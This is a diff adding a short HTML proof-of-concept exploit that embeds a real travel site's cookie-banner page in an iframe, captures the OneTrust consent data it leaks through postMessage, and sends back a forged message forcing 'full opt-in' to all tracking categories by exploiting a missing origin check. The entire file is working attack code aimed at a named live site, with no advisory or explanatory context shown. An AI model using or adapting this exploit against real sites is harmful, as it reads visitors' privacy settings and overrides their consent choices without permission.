@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PoC</title>
+</head>
+<body>
+    <iframe id="target" src="https://www.booking.com/cookiebanner.html"></iframe>
+
+    <script>
+        const targetFrame = document.getElementById('target');
+
+        // 1. Listen for the leak (Information Disclosure)
+        window.onmessage = function(e) {
+            if (e.data && e.data.name === "OneTrustCookies") {
+                console.log("Stolen Data:", e.data);
+                alert("STOLEN CONSENT: " + e.data.OptanonConsent);
+                
+                // 2. Trigger the Injection (State Manipulation)
+                inject();
+            }
+        };
+
+        function inject() {
+            // Crafting a payload to force "Full Consent" for all tracking
+            const payload = {
+                OptanonConsent: "groups=C0001:1,C0002:1,C0003:1,C0004:1",
+                OptanonAlertBoxClosed: "true"
+            };
+
+            // Exploit lack of origin check in receiveMessage
+            targetFrame.contentWindow.postMessage(payload, "*");
+            alert("INJECTED: Cookies forced to 'Full Opt-In' status.");
+        }
+    </script>
+</body>
+</html>
